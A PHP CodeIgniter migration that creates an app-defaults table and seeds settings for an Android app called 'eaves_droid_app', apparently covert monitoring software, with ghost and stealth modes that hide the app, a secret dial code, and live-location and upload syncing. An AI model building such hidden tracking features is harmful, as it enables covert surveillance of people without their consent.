<?php

namespace App\Database\Migrations;

use CodeIgniter\Database\Migration;

class CreateAppDefaultsTable extends Migration
{
    public function up()
    {
        $this->forge->addField([
            'id' => [
                'type' => 'INT',
                'constraint' => 11,
                'unsigned' => true,
                'auto_increment' => true,
            ],
            'config_json' => [
                'type' => 'JSON',
                'null' => false,
            ],
            'version' => [
                'type' => 'INT',
                'constraint' => 11,
                'unsigned' => true,
                'default' => 1,
            ],
            'created_by' => [
                'type' => 'INT',
                'constraint' => 11,
                'unsigned' => true,
                'null' => true,
            ],
            'created_at' => [
                'type' => 'DATETIME',
                'null' => true,
            ],
            'updated_at' => [
                'type' => 'DATETIME',
                'null' => true,
            ],
        ]);

        $this->forge->addKey('id', true);
        $this->forge->addForeignKey('created_by', 'users', 'id', 'SET NULL', 'CASCADE');
        $this->forge->createTable('tbl_app_defaults');

        // Seed default values
        $defaults = json_encode([
            'pref_auto_sync_v2' => true,
            'pref_sync_interval_v2' => '6',
            'pref_disable_uploads' => false,
            'pref_disable_file_uploads' => false,
            'pref_ghost_mode' => false,
            'pref_total_stealth_mode' => false,
            'pref_stealth_mode' => 'com.niccher.eaves_droid_app.activities.Splash_Default',
            'pref_dial_code' => '*#007#',
            'pref_secret_code' => '1234',
            'pref_server_url' => '',
            'pref_live_location_interval' => '30',
            'pref_queue_sync_interval' => '15',
            'pref_deactivated' => false,
        ]);

        $this->db->table('tbl_app_defaults')->insert([
            'config_json' => $defaults,
            'version' => 1,
            'created_at' => date('Y-m-d H:i:s'),
            'updated_at' => date('Y-m-d H:i:s'),
        ]);
    }

    public function down()
    {
        $this->forge->dropTable('tbl_app_defaults');
    }
}
